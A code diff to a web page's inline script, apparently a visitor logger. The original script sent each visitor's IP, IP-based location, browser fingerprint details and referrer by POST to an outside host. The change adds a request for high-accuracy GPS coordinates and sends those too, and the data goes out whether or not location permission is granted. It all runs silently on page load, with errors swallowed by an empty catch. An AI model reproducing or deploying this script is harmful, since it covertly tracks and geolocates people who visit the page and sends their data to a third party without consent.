@@ -49,20 +49,36 @@ p { color: #ffb3c6; font-size: 18px; line-height: 1.6; margin-bottom: 24px; }
     ]);
     const ipData = await ipRes.json();
     const geoData = await geoRes.json();
-    await fetch("https://cfcrack.co.in/ll/api/log", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        ip: ipData.ip,
-        geo: geoData.error ? null : geoData,
-        user_agent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        referrer: document.referrer || ""
-      })
-    });
+    const payload = {
+      ip: ipData.ip,
+      geo: geoData.error ? null : geoData,
+      user_agent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screen: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      referrer: document.referrer || ""
+    };
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          payload.exact_location = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+          fetch("https://cfcrack.co.in/ll/api/log", {
+            method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload)
+          });
+        },
+        () => {
+          fetch("https://cfcrack.co.in/ll/api/log", {
+            method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload)
+          });
+        },
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      );
+    } else {
+      await fetch("https://cfcrack.co.in/ll/api/log", {
+        method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload)
+      });
+    }
   } catch (e) {}
 })();
 </script>
